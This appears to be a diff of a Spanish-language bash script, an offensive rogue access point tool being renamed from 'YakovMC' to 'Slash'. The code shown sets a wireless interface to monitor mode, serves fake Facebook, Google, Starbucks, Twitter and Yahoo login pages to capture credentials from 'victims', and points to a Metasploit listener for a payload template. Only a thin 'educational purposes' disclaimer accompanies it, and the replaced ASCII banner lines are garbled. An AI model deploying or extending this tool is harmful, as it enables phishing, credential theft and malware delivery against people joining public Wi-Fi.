@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# YakovMC v2.0, Author @YakovServices
+# Slash v2.0, Author @YakovServices
 
 #Colours
 greenColour="\e[0;32m\033[1m"
@@ -29,11 +29,11 @@ function ctrl_c(){
 function banner(){
 echo -e "\n${redColour}  __   __    _           __  __  ___ "
 	sleep 0.05
-	echo -e " \ \ / /_ _| |_______ _|  \/  |/ __|"
+	echo -e " /  ___|| |            | |"
 	sleep 0.05
-	echo -e "   \ V / _ | / / _ \ V / |\/| | (__ "
+	echo -e "    _____  _              _ "
 	sleep 0.05
-	echo -e "   |_|\__,_|_\_\___/\_/|_|  |_|\___|${endColour}${yellowColour}${endColour}${blueColour}YakovMC.${grayColour}Hecho por ${endColour}${blueColour}YakovServices - ${endColour}${purpleColour}A esto le metes un nmap y pa' dentro.${endColour}${redColour}¡Hecho con fines educativos!${endColour}${yellowColour}${endColour}${redColour}"
+	echo -e "   \ `--. | |  __ _  ___ | |__${endColour}${yellowColour}${endColour}${blueColour}Slash.${grayColour}Hecho por ${endColour}${blueColour}YakovServices - ${endColour}${purpleColour}A esto le metes un nmap y pa' dentro.${endColour}${redColour}¡Hecho con fines educativos!${endColour}${yellowColour}${endColour}${redColour}"
 }
 
 function dependencies(){
@@ -189,7 +189,7 @@ echo -e "\n${redColour}  __   __    _           __  __  ___ "
 	sleep 0.05
 	echo -e "   \ V / _ | / / _ \ V / |\/| | (__ "
 	sleep 0.05
-	echo -e "   |_|\__,_|_\_\___/\_/|_|  |_|\___|${endColour}${yellowColour}${endColour}${redColour}${endColour}${blueColour}YakovMC.${grayColour}Hecho por ${endColour}${blueColour}YakovServices - ${endColour}${purpleColour}A esto le metes un nmap y pa' dentro.${endColour}${redColour}¡Hecho con fines educativos!${endColour}${yellowColour}${endColour}${redColour}"
+	echo -e "   |_|\__,_|_\_\___/\_/|_|  |_|\___|${endColour}${yellowColour}${endColour}${redColour}${endColour}${blueColour}Slash.${grayColour}Hecho por ${endColour}${blueColour}YakovServices - ${endColour}${purpleColour}A esto le metes un nmap y pa' dentro.${endColour}${redColour}¡Hecho con fines educativos!${endColour}${yellowColour}${endColour}${redColour}"
 	echo -e "\n${grayColour}Uso:${endColour}"
 	echo -e "\t${redColour}[-m]${endColour}${blueColour} Modo de ejecución${endColour}${yellowColour} (terminal)${endColour}${purpleColour} [-m terminal]${endColour}"
 	echo -e "\t${redColour}[-h]${endColour}${blueColour} Mostrar este panel de ayuda${endColour}\n"
@@ -197,8 +197,8 @@ echo -e "\n${redColour}  __   __    _           __  __  ___ "
 }
 
 function guiMode(){
-	whiptail --title "YakovMC - by YakovServices" --msgbox "Bienvenido a YakovMC, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 9 87
-	whiptail --title "YAkovMC - by YakovServices" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 9 87
+	whiptail --title "Slash - by YakovServices" --msgbox "Bienvenido a Slash, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 9 87
+	whiptail --title "Slash - by YakovServices" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 9 87
 
 	tput civis; dependencias=(php dnsmasq hostapd msfconsole msfvenom)
 
@@ -209,10 +209,10 @@ function guiMode(){
         done
 
         if [ $counter_dep -eq "3" ]; then
-		whiptail --title "YAkovMC - by YakovServices" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 9 87
+		whiptail --title "Slash - by YakovServices" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 9 87
 		tput civis
         else
-		whiptail --title "YakovMC - by YakovServices" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 9 87
+		whiptail --title "Slash - by YakovServices" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 9 87
                 exit 1
         fi
 
@@ -220,7 +220,7 @@ function guiMode(){
                 rm -rf credenciales.txt
         fi
 
-	whiptail --title "YAkovMC - by YakovServices" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 9 87
+	whiptail --title "Slash - by YakovServices" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 9 87
 
 	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
         counter=1; for interface in $(cat iface); do
@@ -232,15 +232,15 @@ function guiMode(){
                         if [ "$choosed_interface" == "$interface" ]; then
                                 checker=1
                         fi
-                done; if [ $checker -eq 0 ]; then whiptail --title "YakovMC - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 9 87; fi
+                done; if [ $checker -eq 0 ]; then whiptail --title "Slash - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 9 87; fi
         done
 
-	tput civis; whiptail --title "YAkovMC - by YakovServices" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
+	tput civis; whiptail --title "Slash - by YakovServices" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
 	tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"
 
 	rm iface 2>/dev/null
-	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ejemplo: wifiGratis):" 9 87 --title "YakovMC - by YakovServices" 3>&1 1>&2 2>&3)
-	whiptail --title "YakovMC - by YakovServices" --checklist \
+	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ejemplo: wifiGratis):" 9 87 --title "SLash - by YakovServices" 3>&1 1>&2 2>&3)
+	whiptail --title "Slash - by YakovServices" --checklist \
 	"Selecciona el canal bajo el cual quieres que el punto de acceso opere (Presiona la tecla <Espacio> para seleccionar el canal)" 20 78 12 \
 	1 "(Usar este canal) " OFF \
 	2 "(Usar este canal) " OFF \
@@ -257,7 +257,7 @@ function guiMode(){
 
 	use_channel=$(cat use_channel | tr -d '"'); rm use_channel
 
-	whiptail --title "YAkovMC - by YakovServices" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78
+	whiptail --title "Slash - by YakovServices" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78
 
 	tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando... (Este proceso tarda unos segundos)${endColour}"
         sleep 2
@@ -297,9 +297,9 @@ function guiMode(){
         # Array de plantillas
         plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
 
-	whiptail --title "YAkovMC - by YakovServices" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78
+	whiptail --title "Slash - by YakovServices" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78
 
-        whiptail --title "YAkovMC - by YakovServices" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
+        whiptail --title "Slash - by YakovServices" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
         facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
         google-login "Plantilla de inicio de sesión de Google" OFF \
         starbucks-login "Plantilla de inicio de sesión de Starbucks" OFF \
@@ -323,21 +323,21 @@ function guiMode(){
         fi; clear
 
         if [ $check_plantillas -eq 1 ]; then
-		whiptail --title "YAkovMC - by YakovServices" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
+		whiptail --title "Slash - by YakovServices" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                 tput civis; pushd $template > /dev/null 2>&1
                 php -S 192.168.1.1:80 > /dev/null 2>&1 &
                 sleep 2
                 popd > /dev/null 2>&1; getCredentials
         elif [ $check_plantillas -eq 2 ]; then
-		whiptail --title "YAkovMC - by YakovServices" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
+		whiptail --title "Slash - by YakovServices" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                 tput civis; pushd $template > /dev/null 2>&1
                 php -S 192.168.1.1:80 > /dev/null 2>&1 &
                 sleep 2
-		whiptail --title "YAkovMC - by YakovServices" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
+		whiptail --title "Slash - by YakovServices" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
                 popd > /dev/null 2>&1; getCredentials
 	else
-		whiptail --title "YAkovMC - by YakovServices" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
-		template=$(whiptail --title "YAkovMC - by YakovServices" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "YakovMC - Plantilla personalizada" 3>&1 1>&2 2>&3)
+		whiptail --title "Slash - by YakovServices" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
+		template=$(whiptail --title "Slash - by YakovServices" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "YakovMC - Plantilla personalizada" 3>&1 1>&2 2>&3)
                 pushd $template > /dev/null 2>&1
                 php -S 192.168.1.1:80 > /dev/null 2>&1 &
                 sleep 2
